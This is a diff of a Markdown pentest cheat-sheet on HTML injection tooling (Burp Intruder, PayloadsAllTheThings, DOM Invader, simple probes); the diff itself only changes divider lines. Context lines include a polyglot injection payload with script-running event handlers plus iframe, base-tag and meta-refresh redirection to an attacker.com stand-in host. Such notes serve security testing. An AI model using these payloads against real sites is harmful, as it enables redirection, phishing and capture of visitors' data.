@@ -17,7 +17,7 @@ linked:
 ---
 # HTML Injection - Tooling
 
-***
+---
 
 ## Burp Intruder con HTML Wordlists
 
@@ -37,7 +37,7 @@ linked:
 | Burp Intruder File → Save attack state | Save state for resume | Long attack. |
 ^htmli-tool-burp-intruder
 
-___
+---
 
 ## PayloadsAllTheThings - HTML Injection
 
@@ -61,7 +61,7 @@ ___
 <b>POLYGLOT-MARKER</b><img src=x onerror=alert(1)><svg onload=alert(2)><iframe src="//attacker.com/log"></iframe><base href="//attacker.com/"><meta http-equiv="refresh" content="0;url=//attacker.com">
 ```
 
-___
+---
 
 ## Manual Review (Input/Output Mapping)
 
@@ -98,7 +98,7 @@ for p in '<b>X</b>' '<img src=x>' '<svg>' '<iframe>' '<style>' '<base>' '<meta>'
 done
 ```
 
-___
+---
 
 ## DOM Invader (Burp DOM-side Tools)
 
@@ -116,7 +116,7 @@ ___
 | Right-click finding → "Save to issues" | Save to Burp issues | Reportable. |
 ^htmli-tool-dom-invader
 
-___
+---
 
 ## Otros Tools y Scripts
 
@@ -136,4 +136,4 @@ ___
 | `python3 -c "import requests; r=requests.get('https://target/?q=<HTMLINJ>'); print('<HTMLINJ>' in r.text)"` | DIY Python probe | Quick check. |
 ^htmli-tool-others
 
-***
+---
